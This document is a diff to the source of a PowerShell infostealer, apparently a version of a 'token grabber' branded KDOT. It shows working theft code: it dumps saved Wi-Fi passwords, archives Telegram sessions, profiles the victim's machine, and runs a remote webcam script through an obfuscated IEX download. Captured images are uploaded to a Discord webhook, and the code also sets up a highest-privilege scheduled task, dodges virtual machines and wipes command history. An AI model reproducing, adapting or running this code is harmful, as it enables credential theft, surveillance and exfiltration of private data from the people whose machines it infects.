@@ -17,10 +17,9 @@ function KDMUTEX {
         throw "An instance of this script is already running."
     }
     else {
-        if ($debug) {
+        if ($debug)  {
             Invoke-TASKS
-        }
-        else {
+        } else {
             VMBYPASSER
         }
     }
@@ -263,14 +262,25 @@ function Request-Admin {
 }
 
 function Backup-Data {
-    $folder_general = "$env:APPDATA\KDOT\DATA"
-    $folder_messaging = "$env:APPDATA\KDOT\DATA\Messaging Sessions"
-    $folder_gaming = "$env:APPDATA\KDOT\DATA\Gaming Sessions"
-    $folder_crypto = "$env:APPDATA\KDOT\DATA\Crypto Wallets"
-    $folder_vpn = "$env:APPDATA\KDOT\DATA\VPN Clients"
-    $folder_email = "$env:APPDATA\KDOT\DATA\Email Clients"
-    $important_files = "$env:APPDATA\KDOT\DATA\Important Files"
-    $browser_data = "$env:APPDATA\KDOT\DATA\Browser Data"
+	
+	$uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
+	$timezone = Get-TimeZone
+    $offsetHours = $timezone.BaseUtcOffset.Hours
+    $timezoneString = "UTC$($offsetHours)"
+	$filedate = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd")
+    $countryCode = Invoke-WebRequest -Uri "https://ipapi.co/$ip/country_code" -UseBasicParsing
+    $countryCodeContent = $countryCode.Content
+    $folderformat = Join-Path -Path "$env:APPDATA\KDOT" -ChildPath "$countryCodeContent-($uuid)-($filedate)-($timezoneString)"
+
+	
+    $folder_general = $folderformat
+    $folder_messaging = "$folderformat\Messaging Sessions"
+    $folder_gaming = "$folderformat\Gaming Sessions"
+    $folder_crypto = "$folderformat\Crypto Wallets"
+    $folder_vpn = "$folderformat\VPN Clients"
+    $folder_email = "$folderformat\Email Clients"
+    $important_files = "$folderformat\Important Files"
+    $browser_data = "$folderformat\Browser Data"
 
     New-Item -ItemType Directory -Path $folder_general -Force
     New-Item -ItemType Directory -Path $folder_messaging -Force
@@ -281,67 +291,62 @@ function Backup-Data {
     New-Item -ItemType Directory -Path $folder_email -Force
     New-Item -ItemType Directory -Path $important_files -Force
 
-    #bulk data
-    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
+    #bulk data (added build ID with banner)
+	$ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $ip = $ip.Content
-    $ip > $folder_general\ip.txt
-    $lang = (Get-WinUserLanguageList).LocalizedName
+	$lang = (Get-WinUserLanguageList).LocalizedName
     $date = (get-date).toString("r")
-    Get-ComputerInfo > $folder_general\system_info.txt
-    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
+	$osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
     $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
     $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
+	$mfg = (Get-WmiObject win32_computersystem).Manufacturer
+	$model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
     $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
-    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
-    $uuid > $folder_general\uuid.txt
-    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
-    $cpu > $folder_general\cpu.txt
-    $gpu = (Get-WmiObject Win32_VideoController).Name 
-    $gpu > $folder_general\GPU.txt
-    $format = " GB"
+    $CPU = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
+	$pinfo = Get-WmiObject -Class Win32_Processor
+	$corecount = $($pinfo.NumberOfCores)
+    $GPU = (Get-WmiObject Win32_VideoController).Name 
     $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { "{0:N2}" -f ([math]::round(($_.Sum / 1GB), 2)) }
+	$format = " GB"
     $raminfo = "$total" + "$format"  
     $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -Expand macaddress) -join ","
-    $mac > $folder_general\mac.txt
     $username = $env:USERNAME
-    $hostname = $env:COMPUTERNAME
-    netstat -ano > $folder_general\netstat.txt
-    $mfg = (Get-WmiObject win32_computersystem).Manufacturer
-    #end of bulk data
+    $hostname = $env:COMPUTERNAME	
 	
-    function Get-Uptime {
+	# A cool banner 
+	$guid = [Guid]::NewGuid()
+    $guidString = $guid.ToString()
+    $suffix = $guidString.Substring(0, 8)  
+    $prefixedGuid = "powershell-token-grabber-" + $suffix
+    $ptgbanner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZEgICAgICAgICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWXICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICDilojilojilZTilZDilZDilojilojilZcgICDilZrilZDilZDilojilojilZTilZDilZDilZ0gICDilojilojilZTilZDilZDilZDilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAgIOKWiOKWiOKVkSAgICAgIOKWiOKWiOKVkSAg4paI4paI4paI4pWXICAgICAgICAgICAgICAg4pWRIA0K4pWRICAgICAgICAgICAgICAgICDilojilojilZTilZDilZDilZDilZ0gICAgICAg4paI4paI4pWRICAgICAg4paI4paI4pWRICAg4paI4paI4pWRICAgICAgICAgICAgICAg4pWRIA0K4pWRICAgICAgICAgICAgICAgICDilojilojilZEgICAgIOKWiOKWiOKVlyAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgIGh0dHBzOi8vZ2l0aHViLmNvbS9DaGlsZHJlbk9mWWFod2VoL1Bvd2Vyc2hlbGwtVG9rZW4tR3JhYmJlciAg4pWRDQrilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0NCg==")
+    $ptgstrings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ptgbanner))
+    $ptginfo = "$ptgstrings`nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
+	
+	function Get-Uptime {
         $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
         $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
         $uptimedata
     }
     $uptime = Get-Uptime
-
-    function get-installed-av {
+	
+	function get-installed-av {
         $wmiQuery = "SELECT * FROM AntiVirusProduct"
         $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
         $AntivirusProduct.displayName 
     }
     $avlist = get-installed-av -autosize | Format-Table | out-string
-
-
-    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | % { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | % { (netsh wlan show profile name="$name" key=clear) } | Select-String "Key Content\W+\:(.+)$" | % { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | % { [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass } } | Format-Table -AutoSize 
-    $wifi = $wifipasslist | out-string 
-    $wifi > $folder_general\WIFIPasswords.txt
-
-    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
+	
+	$width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
     $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[2]  
     $split = "x"
     $screen = "$width" + "$split" + "$height"
-
-    #misc data
-    Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $folder_general\StartUpApps.txt
-    Get-WmiObject win32_service | Where-Object State -match "running" | Select-Object Name, DisplayName, PathName, User | Sort-Object Name | Format-Table -wrap -autosize >  $folder_general\running-services.txt
-    Get-WmiObject win32_process | Select-Object Name, Description, ProcessId, ThreadCount, Handles, Path | Format-Table -wrap -autosize > $folder_general\running-applications.txt
-    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $folder_general\Installed-Applications.txt
-    Get-NetAdapter | Format-Table Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium -AutoSize > $folder_general\NetworkAdapters.txt
-
-
-    function diskdata {
+	$software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -wrap -autosize | out-string
+    $network = Get-NetAdapter | Format-Table Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium | out-string
+	$startupapps =  Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List | out-string
+	$runningapps = Get-WmiObject win32_process | Select-Object Name, Description, ProcessId, ThreadCount, Handles | Format-Table -wrap -autosize | out-string
+	$services = Get-WmiObject win32_service | Where-Object State -match "running" | Select-Object Name, DisplayName | Sort-Object Name | Format-Table -wrap -autosize | out-string
+	
+	function diskdata {
         $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
         $results = foreach ($disk in $disks) {
             if ($disk.Size -gt 0) {
@@ -361,9 +366,13 @@ function Backup-Data {
         }
         $results 
     }
-    $alldiskinfo = diskdata | out-string 
-    $alldiskinfo > $folder_general\diskinfo.txt
-
+    $alldiskinfo = diskdata -wrap -autosize | Format-List | out-string
+	$info = "$ptginfo`n`n`nIP: $ip `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
+    $info > $folder_general\System.txt
+	
+	$wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | % { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | % { (netsh wlan show profile name="$name" key=clear) } | Select-String "Key Content\W+\:(.+)$" | % { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | % { [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass } } | Format-Table -AutoSize 
+    $wifi = $wifipasslist | out-string 
+    $wifi > $folder_general\WIFIPasswords.txt
 
     function Get-ProductKey {
         try {
@@ -385,7 +394,7 @@ function Backup-Data {
         if (!(Test-Path $pathtele)) { return }
         try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $destination = "$folder_messaging\Telegram.zip"
-        $exclude = @("_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
+        $exclude = @("_*.config", "temp", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
         $files = Get-ChildItem -Path $pathtele -Exclude $exclude
         Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
     }
@@ -765,8 +774,15 @@ function Backup-Data {
         I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/frontend-src/webcam.ps1")
     }
     Get-WebcamIMG
-
-    Function Invoke-GrabFiles {
+	
+    $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
+    foreach ($item in $items) {
+        $name = $item.Name
+        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
+        Remove-Item -Path "$folder_general\$name" -Force
+    }
+	
+	Function Invoke-GrabFiles {
         $grabber = @(
             "2fa",
             "acc",
@@ -819,13 +835,6 @@ function Backup-Data {
     (Get-ChildItem -path $paths -Include "*.pdf", "*.txt", "*.doc", "*.csv", "*.rtf", "*.docx" -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     Invoke-GrabFiles
-
-    $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
-    foreach ($item in $items) {
-        $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
-        Remove-Item -Path "$folder_general\$name" -Force
-    }
 	
     Set-Location "$env:LOCALAPPDATA\Temp"
 
@@ -897,7 +906,7 @@ function Invoke-TASKS {
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
     Write-Host "Task Created" -ForegroundColor Green
-    HOSTS-BLOCKER
+	HOSTS-BLOCKER
     Backup-Data
 }
 
@@ -912,8 +921,7 @@ if (INVOKE-AC -eq $true) {
     #removes history
     if ($debug) {
         Read-Host "Press Enter to continue..."
-    }
-    else {
+    } else {
         [ProcessUtility]::MakeProcessKillable()
     }
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
@@ -926,24 +934,24 @@ else {
 # SIG # Begin signature block
 # MIIWnAYJKoZIhvcNAQcCoIIWjTCCFokCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
 # gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
-# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUjT50DNekpBm5RfFlJnH9m2Lq
-# aD+gghDrMIIC/jCCAeagAwIBAgIQRihd14UbBYBFYB6wG6qTWjANBgkqhkiG9w0B
-# AQsFADAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwHhcNMjQwMjI1MTc1MDM2WhcN
-# MzQwMjI1MTgwMDM2WjAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwggEiMA0GCSqG
-# SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCuGHL4cjbjwjkbEU6YB792yy6geMD6gIbj
-# IdPEG5iSpT5hVE2Cw40DcLreoSDoYYrAFuigwJ2cx0wXP3i3HCmqGv2meMqHkJSQ
-# B3yTNtxW1PUDJV+xtUmhpxEDNMUG0dXy89w5141UtIMbBLzUtogQh5Sv4czpLmFd
-# wetZxAyn4+BDqxk3U+0By70AAwjZaN9kCd2jpIcXfLFtBUvHixaHvry3L1HCFjxr
-# ZzfLrjop5rZvA0fbaxlq/B+nWDJnJiAnxV1Um0QrHF/NLkwpmRAmNDMQWBynyFnj
-# 0zDO+wR+t5krDnlRVewLt9341eaO/DJ+y10YNBhvr8loqxoMqYQVAgMBAAGjRjBE
+# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUySncggOhEhQxg7h+4CDkdY9S
+# 7o+gghDrMIIC/jCCAeagAwIBAgIQNZ2siXh+aIFO470KIbV4ADANBgkqhkiG9w0B
+# AQsFADAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwHhcNMjQwNDI1MTgyNTA0WhcN
+# MzQwNDI1MTgzNTA0WjAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwggEiMA0GCSqG
+# SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZpegRqfRB0TgxLaZe09cNUfKKxCkMtTSf
+# AZ7+VSzVFTByUIs4qKgQoCvUhkZK933Kr0bAN+GHJGSKLJ9H0EMGTKQzUOvHc19Y
+# gQaZowyxxK/GEAzF9DlItxwlYqsX1nEGoBovRzstW31s6ETiURhkTa6kS5a4ZUHg
+# iLxwtk1b1Ndetc13tRdtX/VFF0I6K11dgpmlvmjIFJDxrl26+S6MkLgU722lrTfW
+# rgfAdD+fREYIQB9yiy0kQHCzY+7pl2AKIrKK61OQOVXsxAhq3q2AgdUsy9MTXgE7
+# nPK2pXQxnWBDPSzyJFyZXxzO128XipVQRZLCwfDIkaHNGT5iIhrtAgMBAAGjRjBE
 # MA4GA1UdDwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU
-# 65VlAxlZ3FuFpb4JW3urUvQXdnEwDQYJKoZIhvcNAQELBQADggEBAAd9hMR1Xugr
-# ojsGXl8iXpzjYLXJhwOBbRDDhr/PHGP240ZR5/OjkrQv7pjBHfWMXnwfaGMKWVp7
-# WKeJJsF/Cg7DTPTp7GyPIfnn2zZv5IJgdaKjkKfVV3KzoqjesgbtqQhUh/KCf37Z
-# j8GLjGsvxxC4A4NXFyCEyusG3RDwMDfo4kdCVh9aX2OvR1j1Zu5Ud5UpoUTkighb
-# LXQq8mtjrAchM+ojNHVoU52+WX3yQpPqmhnCn5firTRhmWh17Z5ukciMUweRp/rD
-# wcbraTfVypJUB5ROoR+i60p+5GsOH9yLYIQgjpWCKSY7uZt67CfNfS2ToIwz287e
-# U/vWw7g/MCswggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3
+# XkwhRG1dSXF1rLJ1BKloHInnYPswDQYJKoZIhvcNAQELBQADggEBACiMEK92Ue1x
+# 0XEq2hR/XlVYlhbDJGASoHfyTv0Y3U6Mrb7+dE72E2/CTzhXL9T0iQtRVjgdIKEN
+# Q8gfeeWZaIXamxnBzOgak6I/URsszj32Gr4H58KQGxQnixcGDQLgTswqlCVnMNNJ
+# VjCPzSkTWzt0gGl0UYi6t68byqC1xkprVtpYwfreGGm1culRMiRSzGkmDK3nkXDV
+# RyGoDPEXmZ5kHxM/qzeu8foDTJYpZqAozpzBzgybGQKA4iGsVk7BBjGeCZRXo+JD
+# ocCe+l6ujEfpRp9NQdn4XBk6JJYE9kD6vMFdCYIRo+5V7p+3rm/BCSDDvO00v69P
+# j94500kTVCswggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3
 # DQEBDAUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMKTmV3IEplcnNleTEUMBIG
 # A1UEBxMLSmVyc2V5IENpdHkxHjAcBgNVBAoTFVRoZSBVU0VSVFJVU1QgTmV0d29y
 # azEuMCwGA1UEAxMlVVNFUlRydXN0IFJTQSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0
@@ -1018,31 +1026,31 @@ else {
 # tO2gLe5zD9kQup2ZLHzXdR+PEMSU5n4k5ZVKiIwn1oVmHfmuZHaR6Ej+yFUK7SnD
 # H944psAU+zI9+KmDYjbIw74Ahxyr+kpCHIkD3PVcfHDZXXhO7p9eIOYJanwrCKNI
 # 9RX8BE/fzSEceuX1jhrUuUAxggUbMIIFFwIBATArMBcxFTATBgNVBAMMDEtET1Qg
-# Um9vdCBDQQIQRihd14UbBYBFYB6wG6qTWjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGC
+# Um9vdCBDQQIQNZ2siXh+aIFO470KIbV4ADAJBgUrDgMCGgUAoHgwGAYKKwYBBAGC
 # NwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor
-# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUILwkDIiG
-# iorkl2EliSz9w4wfXnEwDQYJKoZIhvcNAQEBBQAEggEAYIUOpaOBaEP3sTM7TCN7
-# oOAPX8Et1B8gumiWNzFVEqjZIlxEs21BlK/E4y8Mn0h1PUDwh0pqsyfBTZwbQhKB
-# mbSSV3K0P98EbIpipGIV0I8zXY2MGv6RS5dYLQ2rSk3O9FYxGT9CspbpkxX2YEmd
-# q2IiZHDQRAjY4ISjaezRvxowtYxRdvhetCcjK/i08plrE6Wn4oXYMBRqNLBNpq2r
-# qAMQzc+Z/Q744G9FBexLeNNVzO9gEzzpfmT7F/e9+MI5p2NjFLy0VYEa2IaP910Q
-# ukFXUJ+AbwL5YnxQ9oTwtUjnbmkcoIJlHirJN6PAB1neZ8LJC28Qq5g9TvL0jkUp
-# kKGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYDVQQGEwJH
+# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUgP7uox5T
+# UUZqERcehtt0poY73gkwDQYJKoZIhvcNAQEBBQAEggEADSdeRQ0LYuu55jsa/VoT
+# rql6o5C+/2VV7vnsJOzZx+y7b/CMeO4jv9JVw2J42b4gRYy27C40qFc04PhrWgxr
+# PGfO1GY2XUoqdue2ZUwwLKbaxeW6gX9cCpzWtwTOjOt7vndBwnvqDdbGAJd0uy5u
+# QJGbPvUZ3CNuCV2EIMk0mOSeRb1VJBvPCYoGaYXR/81DbXYw+tRC28u5LTuIsTuB
+# Axn5vSmkzOuk4EdkCHUvOWcv2v0uOGeNSqmISMbQB/ZpeVshPHyz6o4A2wJOQqis
+# voarrWS2a1gG+4EoIXHoMKrOy86uVGgUuwanBai8vpoPWsP/0PAfj6vjN+/xkU7A
+# aqGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYDVQQGEwJH
 # QjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3Jk
 # MRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNB
 # IFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZIAWUDBAIC
 # BQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0y
-# NDAyMjUxODAwNDJaMD8GCSqGSIb3DQEJBDEyBDCb1i/66IeWQD8JdS1ilmWv1Ij0
-# LUpnouTKQ6++y3Dg/OpoMQ6Jb3S/Jt7BRi/vctkwDQYJKoZIhvcNAQEBBQAEggIA
-# oTcy7tawY5ZFfkBFRmb1BBSDkZ+a7HQaCZj5tEvMAvVAqjQhkHWXfOYrPMxPZq7P
-# 8cbWMew/yWru50EnOzvFqs6eODrrH5IjeiHgmrbjundhQoHVJaaT4RefvC3EemXk
-# K95mcWvj22HIxa9qNaNf6rX02VyjkGtD7mrNrB/zWUan/lrKvmnoTrORb8+wPv+m
-# TMPbjysEqxX+zd7vdG080HNQOtz2UVJAkzCWM9SXxrswNx58dIoJHfVBzvuutXlS
-# NX6d72CapbXpLo5JjtVRZI+2zihJFiH6GrCRi5k6y62yfq1JIT8IfQ/xzWnztKCa
-# kxmxHsWdZlm8b4ZO2FkWxebHiEmrqlxkyy43QeaSLfbifpD1LL3zCf1xJfCrzAK7
-# bnLXmCW4g/bO0CYoYBKhLr9samfc1tsZYoLss2fzlKVTLggZl4ejvhRwLoTCPd+2
-# UNqPV4GrIeEj1afyQ7zHIVP31zW74dlkESt7SJsfY66u9flk7NckKMK5yK7qjGUK
-# w+eQ+niAaV80YhXrQuORIu2OcdBG8dUeA9sQYPangzbpik4k9IuS7JghVnmxL+Ir
-# 97g5V5U37eS3H99O5JLfOgbR49Xa7k/kGDDNB5NoNJS6bRbCnp+AKota5hoUZsVu
-# RjJthPByJ2UfQsc6GkpWA6zCe3xs/DMti6e5Nru5uI8=
+# NDA0MjUxODM1MDhaMD8GCSqGSIb3DQEJBDEyBDANa3PiG6ua+nR+EFgIegwtx03L
+# GO92rZkGIHOz6ZuqbCEPSOzO5Z0mkwbe7fvBqRYwDQYJKoZIhvcNAQEBBQAEggIA
+# pFvRS8WgXT8dr916OkrRO6GNLr2NMxU5D+huizBvYhXj9FG6SxGEboxUNLg/wveu
+# 2jxZnXdU3D236W1rNOi8o4AzNiTb/LujOirpIUmaunEiLiRR7QVxvhIY7xMNd3qH
+# 04G6ASBOJWMpOzO2pc8l6l8d+YlvELToGi4sv6pjsSSP3njiSQJkymNYfnY5Xfvi
+# t8JlpeoVUgdy9iWyeFrR/7mpzvtMwQ5GQUqPqFrTAMsm+gR8NKAoDtZkL6FFST6z
+# 1tgxxD4ERnwoB759xZbEjxgHNAqFkL1eqeQP9I/5eiixVytmyLR2oRKAx8hc+MfB
+# uebMM1FAktLH4DxYibcn/mmWk51XSrq3ypELlelrKfAdmA+rhlwAFYw+iFFZloVl
+# csGPeVmBkW91ah5TAjRFHPY1CqMy9WaPhvUeJgGNilIo90hbsK+csLxkrfXCYNDW
+# pSBoOCoa2w7vOoHeLjpWiytiS6l3YIW3uR5/9P0GG6UXQeT73p1GiI5qwNfPMLEq
+# 0Qb+BIYJrnviVXfdhOqMdB07TwUzHsg5NtXph/fYP0zHGKth/o010uV1OKdIGSX+
+# dTBG8Hb6ffZPXgnBD8+kIjhgLyqkU0uoU3ObozQfjQm6YXnmAUvSsK4iVA02K/ar
+# I1mHPapQzdsgXUQGBa4QldcfN87aELvRsjTva+eLGBg=
 # SIG # End signature block
